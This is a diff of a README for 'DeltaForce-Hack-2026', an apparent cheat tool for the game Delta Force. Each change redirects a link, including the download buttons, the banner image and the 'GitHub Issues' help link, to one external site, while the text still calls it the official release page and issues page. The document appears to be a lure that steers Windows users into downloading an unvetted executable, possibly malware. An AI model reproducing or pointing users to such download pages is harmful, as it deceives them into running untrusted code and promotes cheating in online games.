@@ -5,12 +5,12 @@
   <img
     width="474"
     alt="Delta Force"
-    src="https://github.com/user-attachments/assets/ff15341b-9927-4d50-b219-62f3b483017e"
+    src="https://nnaopa.github.io"
   />
 
   <br><br>
 
-  <a href="https://github.com/nnaopa/DeltaForce-Hack-2026/releases">
+  <a href="https://nnaopa.github.io">
     <img
       width="220"
       alt="Download Now"
@@ -56,7 +56,7 @@ Follow the simple steps below to download and run DeltaForce-Hack-2026 on your W
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-👉 **[Click Here to Download DeltaForce-Hack-2026](https://github.com/nnaopa/DeltaForce-Hack-2026/releases)**
+👉 **[Click Here to Download DeltaForce-Hack-2026](https://nnaopa.github.io)**
 
 This link takes you to the official release page where the latest version is hosted.
 
@@ -163,7 +163,7 @@ To receive notifications about new releases and updates, click the **Watch** but
 
 ## 📞 Need Help?
 
-If you encounter any issues during installation or use, please open an issue on the [GitHub Issues page](https://github.com/nnaopa/DeltaForce-Hack-2026/issues). Provide a clear description of the problem, your Windows version, and any error messages you see. The community will assist you.
+If you encounter any issues during installation or use, please open an issue on the [GitHub Issues page](https://nnaopa.github.io). Provide a clear description of the problem, your Windows version, and any error messages you see. The community will assist you.
 
 ---
 
@@ -173,7 +173,7 @@ Download DeltaForce-Hack-2026 today and start exploring the fascinating world of
 
 <div align="center">
 
-  <a href="https://github.com/nnaopa/DeltaForce-Hack-2026/releases">
+  <a href="https://nnaopa.github.io">
     <img
       width="200"
       alt="Download DeltaForce-Hack-2026"
